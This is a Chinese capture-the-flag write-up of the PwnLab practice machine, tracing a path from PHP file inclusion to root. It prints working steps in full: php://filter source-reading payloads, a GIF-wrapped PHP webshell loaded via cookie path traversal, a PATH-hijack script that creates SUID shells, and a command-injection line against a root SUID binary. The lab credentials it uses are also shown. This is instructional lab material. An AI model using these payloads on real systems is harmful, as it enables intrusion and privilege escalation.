---
layout: post
title: PwnLab：从一处 LFI 到 root 的三跳
summary: 一个 LFI 读配置拿到库口令，上传图片马拿到 www-data；真正有意思的是后面三跳 —— SUID 跨用户、PATH 劫持、system 拼接。
tags: 打靶 提权 SUID
date: 2026-10-18 07:10:00 +0800
---

这台机器端口很少，80 一个站点，首页写着"内网图片托管"。信息量小，正好一步步走。

## 入口：两个 include

扫出来 `login.php`、`upload.php`、`config.php`。`config.php` 直接访问是空的，但参数名 `page` 看着像包含点：

```
/?page=php://filter/convert.base64-encode/resource=config
```

源码出来了：

```php
$server = "localhost"; $username = "root"; $password = "H4u%QJ_H99"; $database = "Users";
```

回头看 `index.php`，它有两处包含：

```php
include($_GET['page'].".php");      // 带后缀
include("lang/".$_COOKIE['lang']);  // 不带后缀
```

第一处带 `.php`，`php://filter` 能读任意文件；**第二处不带后缀，能包含任意文件名**。后面图马能不能跑起来，就靠这一处。

## 顺带把 php://filter 讲清楚

这个点新手多半想不到，但它其实只有两层概念，拆开看很简单。

**第一层：`include` 是"执行"，不是"显示"。**

`include($_GET['page'].".php")` 干的事是把那个文件**当 PHP 代码跑一遍**。所以哪怕你能控制包含的路径，`?page=config` 的结果也是"跑一遍 config.php"——里面只有变量赋值，没有任何输出，页面上自然什么都没有。**能包含，不等于能看见源码。**

**第二层：`php://filter` 是 PHP 自带的一个包装器，它能在"文件被读出来"和"交给 PHP 执行"之间插一手。**

`php://filter` 的语法是这样：

```
php://filter/<过滤器>/resource=<目标文件>
```

`resource` 指真正要读的文件，`<过滤器>` 是一串要对内容做的变换。关键在于：**`include` 拿到的已经不是原始文件，而是变换后的内容**。于是只要选一个"让内容不再是 PHP 代码"的过滤器，`include` 就会把它当普通文本输出，源码就到手了。

最常用的是 base64：

```
php://filter/convert.base64-encode/resource=config
```

读出来的是 `config.php` 的 base64 文本，页面上看到一长串 `PD9waHA...`，本地解一下就是源码。

**为什么非得是 base64**：`php://filter` 不加任何过滤器时（`php://filter/resource=config`），内容原样返回，`<?php` 还在，`include` 照样执行 —— 等于白折腾。必须换成"把 `<?php` 也一起编码掉"的形式，base64、`string.rot13`、`convert.iconv.UTF8.UTF16` 都可以，base64 最省事、不丢字节。

**几个容易卡住的细节**：

- 页面返回的那一长串是 **base64**，要自己解。直接看是看不懂的，不少人到这一步以为没成功。
- `resource=` 后面写的是**完整文件名**。这里的代码会补 `.php`，所以写 `config` 而不是 `config.php`，写后者会变成 `config.php.php`。
- `php://filter` 是**本地**包装器，不需要 `allow_url_include`，只要 `allow_url_fopen` 是开的（默认就是）。
- 页面上如果冒出一串提示说 `page` 参数不存在之类的，先确认 `.php` 后缀补的对不对 —— 这是这一步最常见的失败原因。

## 数据库只给到账号

用读出来的口令连 MySQL（客户端要加 `--skip-ssl`，否则报 TLS 错）：

```
mysql -h <target-ip> -u root -p'H4u%QJ_H99' --skip-ssl
```

root 是 root，但 `INTO OUTFILE` 报 **ERROR 1045**，`LOAD_FILE` 返回 NULL —— **有 root 不等于有 FILE 权限**，这条路直接断掉。

能拿的是 `Users.users`：

```
kent  Sld6WHVCSkpOeQ==
mike  U0lmZHNURW42SQ==
kane  aVN2NVltMkdSbw==
```

登录代码是 `base64_encode($_POST['pass'])` 再进 `bind_param`，所以这三串是 base64 之后的口令，解出来直接能登录站内。

## www-data：图片马 + 无后缀包含

`upload.php` 的检查是扩展名白名单 + `getimagesize` 的 mime，存成 `md5(原名).扩展名`，而且 `upload/` 是个指向 `/tmp` 的软链。

所以做法是：做一个**合法 1×1 GIF**（不合法 `getimagesize` 会返回 false），把 PHP 接在 GIF 尾部，登录后上传：

```
GIF89a\x01\x00\x01\x00\x80\x00\x00\x00...;<?php echo "\n"; system($_REQUEST["c"]); ?>
```

上传后路径是 `upload/<md5>.gif`，直接用那个不带后缀的包含点执行：

```
Cookie: lang=../upload/<md5>.gif
GET /?c=id        → uid=33(www-data)
```

为什么不用 `?page=`：它会给路径补 `.php`，`.gif` 就废了。

## 第一跳：kane 的目录里躺着 SUID

`/etc/passwd` 里除了 john，还有 kent / mike / kane。用库里的口令试系统登录 —— 这次 kane 的口令能进（`su` 需要 tty，非交互环境要用 `script -qc` 包一层）。

```
su kane
Password: iSv5Ym2GRo
```

进去以后在 `/home/kane` 里有个 `msgmike`，**属主 mike、带 SUID**：

```
-rwsr-sr-x 1 mike mike 5148 msgmike
```

`strings` 一看，它执行的是 `cat /home/mike/msg.txt`，**相对路径**。于是塞一个假的 `cat` 到 `/tmp/h`，用 `PATH` 抢在真 `cat` 前面：

```sh
# /tmp/h/cat
#!/bin/sh
cp /bin/bash /tmp/nb
chmod 4755 /tmp/nb

PATH=/tmp/h:/usr/bin:/bin /home/kane/msgmike
```

`msgmike` 是 SUID mike，它调用的 `cat` 就是我的脚本，于是复制出来的 `/tmp/nb` 带 **mike** 的 SUID：

```
-rwsr-xr-x 1 mike mike 1105840 /tmp/nb
/tmp/nb -p -c id
uid=33(www-data) gid=33(www-data) euid=1002(mike)
```

## 第二跳：msg2root 的拼接

`/home/mike` 里有个 `msg2root`，`-rwsr-sr-x root root`。看它的字符串：

```
Message for root:
/bin/echo %s >> /root/messages.txt
```

`/bin/echo` 是**绝对路径**，PATH 劫持对它没用。但它把 stdin 读到的那一行**直接拼进命令**交给 `system()`，于是拼一句进去就行：

```
x; cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb
```

`system()` 是以 root 身份跑的，`/tmp/rb` 出来就是 SUID root：

```
/tmp/rb -p -c id
uid=33(www-data) gid=33(www-data) euid=0(root)
```

`/root` 下两个 txt：`flag.txt`（权限 `----------`，内容是那面横幅）和 `messages.txt`。

## 新手容易踩的几处

- **`find / -perm -4000` 扫不到 `750` 目录里的 SUID。** 这台机器的 `msgmike` 就在 `/home/kane`（`drwxr-x---`）里，用 `www-data` 身份跑 `find` 连目录都进不去，结果里干干净净，很容易以为"没有可疑 SUID"。换到能进该目录的用户身份再扫一遍，或者先看 `ls -la /home/*` 的权限再决定用什么身份扫。
- **`su` 需要 tty。** webshell 里 `su` 会直接报认证失败或 `user does not exist` 之类，看着像口令错，其实是拿不到终端。用 `script -qc 'su ...' /dev/null`，或先把 shell 升级成 `python -c 'import pty; pty.spawn("/bin/bash")'`。
- **图片马的 GIF 头必须是真的。** 只写 `GIF89a;` 六个字节，`getimagesize()` 返回 false，会被 `mime` 那条检查拦下。要用完整的 1×1 GIF（含逻辑屏幕描述符和图像数据），再把 PHP 接在后面。
- **无后缀包含点比带后缀的值钱。** 同一个页面两个 include，一个补 `.php` 一个不补，后者才是能让 `.gif` 执行的那个。
- **MySQL 的 root 和 MySQL 的 FILE 权限是两件事。** 前者让你读库，后者才让你读写文件；`INTO OUTFILE` 报 `ERROR 1045`、`LOAD_FILE` 返回 NULL，就是这里被卡住了。
- **PATH 劫持只对"相对路径调用"有效。** `system("cat x")` 能劫，`system("/bin/echo x")` 不能。看到绝对路径别急着放弃 —— 看参数有没有拼进命令里，那才是另一个口子。
- **`echo` 是 shell 内建。** 就算 `msg2root` 写的是 `echo` 而不是 `/bin/echo`，PATH 里放个假 `echo` 也没用，内建优先。这种时候要往"参数拼接"的方向想，而不是继续在 PATH 上找。
- **库口令不等于系统口令。** 这台 kane 恰好两边一样，但不该默认如此；先试一下，不行就换方向。

## 收尾

拿 root 之后把 `/tmp` 下的 SUID 副本、图片马、放脚本的目录都删掉，靶机上没有留持久化。这台机器值得练的地方不在前面那个 LFI，而在后面三跳：**SUID 换用户、相对路径劫持、命令拼接** —— 三种完全不同层次的问题，串起来就是一条完整的提权链。
